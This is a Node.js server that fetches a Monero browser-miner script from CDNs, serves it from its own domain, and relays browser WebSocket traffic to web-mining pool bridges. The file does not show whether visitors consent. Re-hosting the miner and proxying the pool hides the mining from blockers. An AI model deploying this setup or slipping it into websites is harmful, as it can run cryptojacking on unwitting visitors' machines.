const http = require('http');
const fs = require('fs');
const path = require('path');
const { WebSocketServer, WebSocket } = require('ws');

const PORT = Number(process.env.PORT || 8080);

// miner payload sources, tried in order and cached server-side
const MINER_SOURCES = [
  'https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js',
  'https://raw.githack.com/NajmAjmal/monero-webminer/main/script.js'
];

// upstream web-mining bridges, tried in order
const RELAY_TARGETS = [
  'wss://webminer.moneroocean.stream/',
  'wss://ny1.xmrminingproxy.com/'
];

const MIME = {
  '.html': 'text/html; charset=utf-8',
  '.js': 'text/javascript; charset=utf-8',
  '.css': 'text/css; charset=utf-8',
  '.svg': 'image/svg+xml',
  '.ico': 'image/x-icon'
};

let minerCache = null;

async function getMiner() {
  if (minerCache) return minerCache;
  for (const src of MINER_SOURCES) {
    try {
      const r = await fetch(src, { redirect: 'follow' });
      if (!r.ok) continue;
      const text = await r.text();
      if (text.includes('startMining')) {
        minerCache = text;
        console.log('miner payload cached from', src);
        return text;
      }
    } catch (e) {
      console.log('miner source failed:', src, e.message);
    }
  }
  throw new Error('miner payload unavailable');
}

const server = http.createServer(async (req, res) => {
  const pathname = decodeURIComponent(new URL(req.url, 'http://x').pathname);

  if (pathname === '/health') {
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    return res.end('ok');
  }

  if (pathname === '/miner.js') {
    try {
      const js = await getMiner();
      res.writeHead(200, {
        'Content-Type': 'text/javascript; charset=utf-8',
        'Cache-Control': 'public, max-age=86400'
      });
      return res.end(js);
    } catch {
      res.writeHead(502);
      return res.end('// miner unavailable');
    }
  }

  const rel = pathname === '/' ? '/index.html' : pathname;
  const file = path.join(__dirname, 'public', path.normalize(rel).replace(/^(\.\.[/\\])+/, ''));

  fs.readFile(file, (err, buf) => {
    if (err) {
      res.writeHead(404);
      return res.end('not found');
    }
    res.writeHead(200, {
      'Content-Type': MIME[path.extname(file)] || 'application/octet-stream',
      'Cache-Control': 'no-store'
    });
    res.end(buf);
  });
});

// ── relay: browser <-> MoneroOcean web-mining bridge ────────────────────
const wss = new WebSocketServer({
  server,
  path: '/bridge',
  perMessageDeflate: false,
  maxPayload: 1 << 20
});

wss.on('connection', (ws) => {
  let upstream = null;
  let closed = false;
  let tries = 0;
  const pending = [];

  const connect = () => {
    if (closed) return;
    const url = RELAY_TARGETS[tries % RELAY_TARGETS.length];
    tries++;

    const up = new WebSocket(url, { handshakeTimeout: 8000 });
    upstream = up;

    up.on('open', () => {
      while (pending.length && up.readyState === WebSocket.OPEN) up.send(pending.shift());
    });

    up.on('message', (data) => {
      if (ws.readyState === WebSocket.OPEN) ws.send(data.toString());
    });

    up.on('close', () => {
      if (!closed) ws.close();
    });

    up.on('error', () => {
      try { up.terminate(); } catch {}
      if (closed) return;
      if (tries < RELAY_TARGETS.length * 2) setTimeout(connect, 700 * tries);
      else ws.close();
    });
  };

  ws.on('message', (msg) => {
    const text = msg.toString();
    if (upstream && upstream.readyState === WebSocket.OPEN) upstream.send(text);
    else pending.push(text);
  });

  ws.on('close', () => {
    closed = true;
    try { upstream && upstream.terminate(); } catch {}
  });

  ws.on('error', () => {
    closed = true;
    try { upstream && upstream.terminate(); } catch {}
  });

  connect();
});

server.listen(PORT, () => console.log('listening on :' + PORT));
